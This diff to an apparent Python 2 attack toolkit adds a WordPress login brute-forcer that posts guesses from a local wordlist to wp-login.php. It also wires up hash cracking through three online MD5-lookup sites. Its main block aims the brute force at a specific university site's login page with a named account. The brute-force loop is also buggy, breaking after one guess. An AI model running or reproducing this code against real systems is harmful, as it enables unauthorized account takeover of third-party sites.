@@ -12,6 +12,24 @@ import urllib
 import urllib2
 import re
 
+def bruteforce_wordpress(url, name, result):
+    pwd = '/root/weak.txt'
+    #pwd = 'D:\\weak.txt'
+    for line in open(pwd):
+        lineline = line.strip().replace('\n', '')
+        print lineline
+        data = urllib.urlencode({'log':name,'pwd':lineline,'redirect_to':''})
+        content = urllib.urlopen(url, data)
+        if content.read() == '':
+            result.bruteforce_wordpress = lineline
+            return
+        break
+    data = urllib.urlencode({'log':name,'pwd':name,'redirect_to':''})
+    content = urllib.urlopen(url, data)
+    if content.read() == '':
+        result.bruteforce_wordpress = name
+        return
+    result.bruteforce_wordpress = 'Not Found'
 
 
 def hydra(ip, protocal):
@@ -73,17 +91,24 @@ def md5_md5cc(md5):
     else:
         return 'Not Found'
 
-def md5_crack(md5):
+def md5_crack(md5, result):
+    result['www.2d5.net'] = md5_2d5(md5)
+    result['www.somd5.com'] = md5_somd5(md5)
+    result['www.md5.cc'] = md5_md5cc(md5)
+
     #print md5_2d5(md5)
     #print md5_somd5(md5)
-    print md5_md5cc(md5)
+    #print md5_md5cc(md5)
 
 
 if __name__ == '__main__':
+    r = result.result()
     #process = hydra('10.1.10.115', 'ssh')
     #while 1:
     #    status = hydra_getstatus(process)
     #    print status
     #    if status == 'Done':
     #        break
-    md5_crack('47BCE5C74F589F4867DBD57E9CA9F8E8')
+    #md5_crack('47BCE5C74F589F4867DBD57E9CA9F8E8')
+    bruteforce_wordpress('http://jwjcc.bfsu.edu.cn/wp-login.php', 'jwjcc', r)
+    print r.bruteforce_wordpress
